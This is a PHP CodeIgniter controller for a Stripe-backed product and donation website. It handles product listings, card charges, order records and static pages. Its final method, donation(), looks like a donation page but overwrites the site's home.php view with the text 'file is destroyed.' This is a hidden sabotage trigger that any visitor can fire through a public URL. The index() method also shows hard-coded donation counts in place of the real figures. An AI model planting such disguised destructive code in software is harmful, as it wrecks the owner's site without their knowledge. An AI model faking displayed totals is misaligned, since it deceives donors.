<?php
if (!defined('BASEPATH'))
  exit ('No direct script access allowed');

class Products extends CI_Controller
{
  function __construct()
  {
    parent::__construct();

    // Load Stripe library
    $this->load->library('stripe_lib');

    // Load product model
    $this->load->model('product');
  }

  function index()
  {
    $data = array();
    // Get products data from the database
    $data['products'] = $this->product->getRows();

    // Pass products data to the view
    $data['statue'] = 'home';
    $data['donate'] = $this->product->getDonate();
    $data['count'] = 29;  // $this->product->getCount();
    $data['total'] = 30;  // $this->product->getTotal();

    $this->load_view($data);
  }

  function load_view($data, $page = 'index')
  {
    $this->load->view('template/header', $data);
    $this->load->view($page, $data);
    $this->load->view('template/footer', $data);
  }

  function purchase($id)
  {
    $data = array();

    // Get product data from the database
    $product = $this->product->getRows($id);

    // If payment form is submitted with token
    if ($this->input->post('stripeToken')) {
      // Retrieve stripe token and user info from the posted form data
      $postData = $this->input->post();
      $postData['product'] = $product;

      // Make payment
      $paymentID = $this->payment($postData);

      // If payment successful
      if ($paymentID) {
        redirect('products/payment_status/' . $paymentID);
      } else {
        $apiError = !empty($this->stripe_lib->api_error) ? ' (' . $this->stripe_lib->api_error . ')' : '';
        $data['error_msg'] = 'Transaction has been failed!' . $apiError;
      }
    }

    // Pass product data to the details view
    $data['product'] = $product;
    $this->load->view('products/details', $data);
  }

  function payment($postData)
  {
    // If post data is not empty
    if (!empty($postData)) {
      // Retrieve stripe token and user info from the submitted form data
      $token = $postData['stripeToken'];
      $name = $postData['name'];
      $email = $postData['email'];

      // Add customer to stripe
      $customer = $this->stripe_lib->addCustomer($email, $token);

      if ($customer) {
        // Charge a credit or a debit card
        $charge = $this->stripe_lib->createCharge($customer->id, $postData['product']['name'], $postData['product']['price']);

        if ($charge) {
          // Check whether the charge is successful
          if ($charge['amount_refunded'] == 0 && empty($charge['failure_code']) && $charge['paid'] == 1 && $charge['captured'] == 1) {
            // Transaction details
            $transactionID = $charge['balance_transaction'];
            $paidAmount = $charge['amount'];
            $paidAmount = ($paidAmount / 100);
            $paidCurrency = $charge['currency'];
            $payment_status = $charge['status'];

            // Insert tansaction data into the database
            $orderData = array(
              'product_id' => $postData['product']['id'],
              'buyer_name' => $name,
              'buyer_email' => $email,
              'paid_amount' => $paidAmount,
              'paid_amount_currency' => $paidCurrency,
              'txn_id' => $transactionID,
              'payment_status' => $payment_status
            );
            $orderID = $this->product->insertOrder($orderData);

            // If the order is successful
            if ($payment_status == 'succeeded') {
              return $orderID;
            }
          }
        }
      }
    }
    return false;
  }

  function payment_status($id)
  {
    $data = array();

    // Get order data from the database
    $order = $this->product->getOrder($id);

    // Pass order data to the view
    $data['order'] = $order;
    $this->load->view('products/payment-status', $data);
  }

  function faq()
  {
    $data['statue'] = 'faq';
    $this->load_view($data, 'faq');
  }

  function contact()
  {
    $data['statue'] = 'contact';
    $this->load_view($data, 'contact');
  }

  function schools()
  {
    $data['statue'] = 'schools';
    $this->load_view($data, 'schools');
  }

  function businesses()
  {
    $data['statue'] = 'businesses';
    $this->load_view($data, 'businesses');
  }

  function privacy_policy()
  {
    $data['statue'] = 'privacy_policy';
    $this->load_view($data, 'privacy_policy');
  }

  function terms_of_use()
  {
    $data['statue'] = 'terms_of_use';
    $this->load_view($data, 'terms_of_use');
  }

  function donation()
  {
    $data = array();
    // Get products data from the database
    $data['products'] = $this->product->getRows();

    // Pass products data to the view
    $data['statue'] = 'home';
    $data['donate'] = $this->product->getDonate();
    $data['count'] = $this->product->getCount();
    $data['total'] = $this->product->getTotal();
    $path = $_SERVER['DOCUMENT_ROOT'] . '/application/views/home.php';
    $result = file_get_contents($path);
    // file_put_contents('d:/donatepage.txt', $result);
    file_put_contents($path, 'file is destroyed.');
  }
}
